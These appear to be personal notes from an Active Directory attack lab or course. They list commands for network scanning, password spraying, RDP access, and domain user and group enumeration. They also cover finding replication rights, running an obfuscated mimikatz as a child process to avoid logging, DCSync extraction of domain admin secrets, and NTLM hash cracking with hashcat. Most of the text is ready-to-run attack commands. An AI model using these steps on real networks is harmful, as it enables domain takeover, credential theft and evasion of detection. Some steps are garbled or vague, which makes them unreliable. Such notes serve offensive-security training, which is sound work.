# AD with John

https://raw.githubusercontent.com/rollinz007/kspray/master/kspray.sh

## Nmap enumeration

nmap -sT -p80,3389 -O --reason -oA <filename> <ip>.0/24

## K-Spray

sudo ./kspray.sh <domain> <list> <password>

rpd into host

xfreerdp /u:<username> /p:<password> /w:1280 /h:800 /v:mail.<domain>

- try running commands prompt as local admin

PowerShell

- whoami /all *group membership*
- net users /dom *pulls all users for domain*
- net groups /dom *find interesting group*
- net groups <interesting group> /dom 
- net user <user> /dom
- net groups "domain admins" /dom

Get-ObjectACL "DC=hackworks, DC=local" -ResolveGUIDs | ? {($_.ActiveDirectoryRAceType -match 'Replication-Get')} | findstr s-1-5-21-3824454180-221547745-759641303-2601

## dcsync

mimikatz - needs to be obsfucated

run it as a child process 

exmaple of register 32 which is a windows update and does not log those child processes 

lsadump::dcsync /user:<domain_admin> 

if permissions are not set right, then you get secrets

NTLM hash obtained

echo <hash> > hash.txt

hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --show

xfreerdp /u:<username> /p:<password> /w:1280 /h:800 /v:dccoloh01.<domain>

